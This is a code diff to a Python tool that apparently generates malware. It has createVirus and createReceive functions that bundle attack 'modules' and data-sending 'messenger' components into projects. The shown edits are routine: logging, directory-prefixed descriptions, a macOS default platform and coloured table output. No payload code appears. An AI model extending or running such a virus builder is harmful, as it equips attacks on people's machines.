@@ -4,7 +4,7 @@
 import re, os, sys, ast, random, base64, time, json, hashlib
 import astunparse
 from lib.ol.main import onelinerize
-
+from lib.logger import log
 #Importing terminaltables
 try:
     import terminaltables
@@ -101,7 +101,8 @@ class utils():
         return supportedOS.split(",")
 
     @classmethod
-    def checkFile(cls, fileLines, sender = False):
+    def checkFile(cls, fileLines, 
+        path = "", sender = False):
         """
             Check the file and convert it into a dict of important information
             
@@ -160,9 +161,13 @@ class utils():
                         resultTemp["name"] = lineName[0][1]
                         continue
                 if not resultTemp["desc"]:
+                    path = path.replace("module", "")\
+                        .replace("messenger", "").replace("/", "")
+                    if len(path) > 0:
+                        path = "[%s] " % path
                     lineDesc = _desc.findall(i[1])
                     if lineDesc:
-                        resultTemp["desc"] = lineDesc[0][1]
+                        resultTemp["desc"] = path + lineDesc[0][1]
                         continue
             else:
                 trivialResult = cls.checkFile(i[1].split(";"))
@@ -373,7 +378,8 @@ class utils():
                             return True 
                         else:
                             print("[!] Module %s is not supporting %s, ignored" % (
-                            module, platform))
+                                module, platform)
+                            )
                             return False
                     else:
                         print("[!] Module %s is not available, ignored" % module)
@@ -467,7 +473,7 @@ class API():
                     or file.split(".")[-1] in ignoreEnds):
                     moduleInfo.append(utils.checkModule(
                         utils.checkFile(
-                            open(fullpath).readlines()
+                            open(fullpath).readlines(), dirpath
                         ),fullpath
                     ))
         return moduleInfo
@@ -492,14 +498,14 @@ class API():
                     or file.split(".")[-1] in ignoreEnds):
                         sendInfo.append(utils.checkSend(
                             utils.checkFile(
-                                open(fullpath).readlines()
+                                open(fullpath).readlines(), dirpath
                             ),fullpath
                         ))
         return sendInfo
 
     @classmethod
     def createVirus(cls, moduleList, sendList, 
-        projName, platform = platform.system(),
+        projName, platform = 'Darwin',
         sendPath = 'messenger',
         modulePath = "module"):
         """
@@ -542,7 +548,7 @@ class API():
 
     @classmethod
     def createReceive(cls, sendList,
-        projName, platform = platform.system(),
+        projName, platform = 'Darwin',
         sendPath = 'messenger'):
         """
             Generate the receiving code
@@ -574,7 +580,7 @@ class API():
 
     @classmethod
     def createProj(cls, 
-        moduleList, sendList, platform = platform.system(),
+        moduleList, sendList, platform = 'Darwin',
         projName = str(utils.base64Encode(str(time.time() + 
             random.randint(0,20000)))).replace("=", ""),
         sendPath = 'messenger',
@@ -689,7 +695,6 @@ class API():
             return receiveObj
 
 
-
 ############################
 #       CLI Functions      #
 ############################
@@ -741,8 +746,14 @@ class beautify():
         """
         result = [["Name", "Description", "SupportedOS", "Status"]]
         for i in info:
+            
             if i["success"] == 0:
-                result.append([i["name"], i["desc"], i["sys"], "OK"])
+                if i["desc"][0] == "[" and "]" in i["desc"]:
+                    desc = i["desc"].replace("[", "%s[" % log.WARNING_COLOR)\
+                        .replace("]", "]%s" % log.END_COLOR)
+                else:
+                    desc = i["desc"]
+                result.append([i["name"], desc, i["sys"], "OK"])
             else:
                 result.append(
                     [i["name"], i["desc"], i["sys"], "Failed"]
